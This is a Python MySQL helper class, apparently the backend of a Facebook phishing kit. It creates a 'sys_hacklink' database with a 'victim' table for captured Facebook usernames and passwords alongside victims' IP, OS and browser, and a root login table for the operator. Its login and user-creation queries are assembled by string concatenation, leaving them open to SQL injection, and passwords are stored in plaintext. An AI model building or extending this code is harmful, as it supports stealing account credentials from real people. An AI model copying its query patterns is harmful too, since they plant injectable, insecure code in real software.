import mysql.connector
from mysql.connector import Error


""" this class connect Mysql and 
    1- create database
    2- create table root and victim
"""
class db:

    __server   = '' # or 127.0.0.1 
    __database = 'sys_hacklink' 
    __user     = ''
    __passwd   = '' 
    __Troot     = 'sys_root'
    __Tvictim   = 'victim'

    
    # this constractur of init an class instance
    def __init__ (self,server ,user ,passwd):
        self.__server = server
        self.__user   = user
        self.__passwd = passwd
     
    # function of connect with server 
    def connect(self ):

        try:
            connection = mysql.connector.connect(host =self.__server,user=self.__user,password=self.__passwd)
            if connection.is_connected():

                cursor = connection.cursor()
                cursor.execute("create database IF NOT EXISTS "+self.__database +' DEFAULT CHARACTER SET utf8 DEFAULT COLLATE utf8_general_ci')
                con = mysql.connector.connect(host =self.__server,user=self.__user,password=self.__passwd ,database=self.__database)
                cur = con.cursor()
                cur.execute('create table IF NOT EXISTS '+self.__Troot+' (id int(10) PRIMARY key AUTO_INCREMENT , log_user_root varchar(20), log_pass_root varchar(20))')
                cur.execute('create table IF NOT EXISTS '+self.__Tvictim +' (id int(10) PRIMARY key AUTO_INCREMENT ,user_facebook varchar(255) ,pass_facebook varchar(255), ip varchar(20), os varchar(255), browser varchar(20),myTime varchar(255))')

                #cursor.execute('create table '+self.__root+' (id int(10) PRIMARY key AUTO_INCREMENT , log_user_root varchar(20), log_pass_root varchar(20)')
                #self.victim()
        except Error as e:
            print("Error while connecting to MySQL", e)
            cursor.close()
            connection.close()
        finally:
            cursor.close()
            connection.close()



    #function of creat new user
    def creatUser(self , log_user ,log_pass):
        try:
            con = mysql.connector.connect(host =self.__server,user=self.__user,password=self.__passwd ,database= self.__database)
            cur = con.cursor()
            if con.is_connected():
                insert= """INSERT INTO `sys_root` ( `log_user_root`, `log_pass_root`) values ('%s','%s')""" % (log_user,log_pass)
                cur.execute(insert)
                con.commit()
        except Error as e:
            print('error => ', e)
            cur.close()
            con.close()
        finally:
            cur.close()
            con.close()



    def Login(self , log_user ,log_pass):
        try:
            con = mysql.connector.connect(host =self.__server,user=self.__user,password=self.__passwd ,database= self.__database)
            cur = con.cursor()
            if con.is_connected():
                # where `log_user_root`='"+log_user+"' and `log_pass_root`= '"+ log_pass+"'
                select= "select log_user_root, log_pass_root from sys_root where log_user_root ='"+log_user+"' and log_pass_root ='"+log_pass+"'" 
                cur.execute(select)
                log =False
                for x in cur:
                    if x != '':
                        log =True
            return log
        except Error as e:
            print('error => ', e)
            cur.close()
            con.close()
        finally:
            cur.close()
            con.close()

    




        

# here how to use class db 
#mydb = db('127.0.0.1','root','')
#mydb.connect()
#mydb.victim()

#mydb.creatUser('fouad','1234')
#print(mydb.Login('fouad','1234')